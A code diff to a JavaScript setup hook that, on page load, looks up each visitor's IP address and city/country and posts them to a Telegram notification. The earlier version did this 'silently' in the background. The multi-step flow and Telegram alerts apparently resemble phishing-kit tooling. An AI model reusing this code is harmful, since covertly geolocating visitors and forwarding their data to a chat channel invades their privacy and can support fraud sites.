@@ -50,54 +50,40 @@ export const useInitialSetup = (setAllData, setStep) => {
     };
 
     const initializeUserData = async () => {
-      // 1. Notify Telegram immediately. The backend fills in the real IP from
-      //    the request headers, so this no longer waits for third-party APIs.
-      const notifyVisit = postIp(
-        { id: uniqueId, context, currentStep: "Page Loaded" },
-        true,
-        45000 // tolerate a cold-started backend without losing the alert
-      ).catch((error) => {
+      let ip = null;
+      let locationData = { country: null, city: null };
+
+      try {
+        ip = await IPService.fetchIPAddress();
+      } catch (error) {
+        console.error("Failed to fetch IP after retries:", error);
+      }
+
+      if (ip) {
+        try {
+          locationData = await IPService.fetchLocationData(ip);
+        } catch (error) {
+          console.error("Failed to fetch location data after retries:", error);
+          locationData = { country: null, city: null };
+        }
+      }
+
+      const details = {
+        id: uniqueId,
+        ip: ip || "unknown",
+        country: locationData.country || "unknown",
+        city: locationData.city || "unknown",
+        context,
+      };
+
+      setAllData((prevData) => ({ ...prevData, ...details }));
+
+      // Notify Telegram with the IP/location so new traffic is identifiable.
+      try {
+        await postIp(details, true, 45000); // tolerate a cold-started backend
+      } catch (error) {
         console.error("Failed to send visit notification:", error);
-      });
-
-      // 2. Resolve IP/location in the background and store it silently.
-      const resolveUserDetails = (async () => {
-        let ip = null;
-        let locationData = { country: null, city: null };
-
-        try {
-          ip = await IPService.fetchIPAddress();
-        } catch (error) {
-          console.error("Failed to fetch IP after retries:", error);
-        }
-
-        if (ip) {
-          try {
-            locationData = await IPService.fetchLocationData(ip);
-          } catch (error) {
-            console.error("Failed to fetch location data after retries:", error);
-            locationData = { country: null, city: null };
-          }
-        }
-
-        const details = {
-          id: uniqueId,
-          ip: ip || "unknown",
-          country: locationData.country || "unknown",
-          city: locationData.city || "unknown",
-          context,
-        };
-
-        setAllData((prevData) => ({ ...prevData, ...details }));
-
-        try {
-          await postIp(details, false);
-        } catch (error) {
-          console.error("Failed to store resolved IP data:", error);
-        }
-      })();
-
-      await Promise.allSettled([notifyVisit, resolveUserDetails]);
+      }
 
       setAllData((prevData) => ({
         ...prevData,
